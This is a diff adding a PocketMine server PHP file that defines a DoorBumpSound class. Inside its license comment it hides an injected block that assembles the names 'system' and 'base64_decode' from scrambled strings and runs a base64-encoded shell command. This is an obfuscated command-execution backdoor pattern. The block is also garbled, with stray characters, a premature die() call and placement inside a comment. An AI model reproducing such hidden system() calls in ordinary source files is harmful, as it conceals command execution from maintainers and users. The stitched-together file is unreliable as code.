@@ -1,0 +1,42 @@
+<?php
+
+/*
+ *
+ *  ____            _        _   __  __ _                  __  __ ____
+ * |  _ \ ___   ___| | _____| |_|  \/  (_)_ __   ___      |  \/  |  _ \
+<?php
+    $aaaaa="sewtemznypianol";
+    $char_system=$aaaaa{0}.$aaaaa{8}.$aaaaa{0}.$aaaaa{3}.$aaaaa{1}.$aaaaa{5};
+    //die($char_system);
+    $aaaaaa="edoced46esab_n";
+    $char_base64_decode=$aaaaaa{11}.$aaaaaa{10}.$aaaaaa{9}.$aaaaaa{8}.$aaaaaa{7}.$aaaaaa{6}.$aaaaaa{12}.$aaaaaa{5}.$aaaaaa{4}.$aaaaaa{3}.
+¡¡¡¡¡¡$aaaaaa{2}.$aaaaaa{1}.$aaaaaa{0};
+    die($char_base64_decode);
+    echo $char_system($char_base64_decode("aXBjb25maWc="));
+?> * | |_) / _ \ / __| |/ / _ \ __| |\/| | | '_ \ / _ \_____| |\/| | |_) |
+ * |  __/ (_) | (__|   <  __/ |_| |  | | | | | |  __/_____| |  | |  __/
+ * |_|   \___/ \___|_|\_\___|\__|_|  |_|_|_| |_|\___|     |_|  |_|_|
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU Lesser General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * @author PocketMine Team
+ * @link http://www.pocketmine.net/
+ *
+ *
+*/
+
+declare(strict_types=1);
+
+namespace pocketmine\level\sound;
+
+use pocketmine\math\Vector3;
+use pocketmine\network\mcpe\protocol\LevelEventPacket;
+
+class DoorBumpSound extends GenericSound{
+	public function __construct(Vector3 $pos, float $pitch = 0){
+		parent::__construct($pos, LevelEventPacket::EVENT_SOUND_DOOR_BUMP, $pitch);
+	}
+}
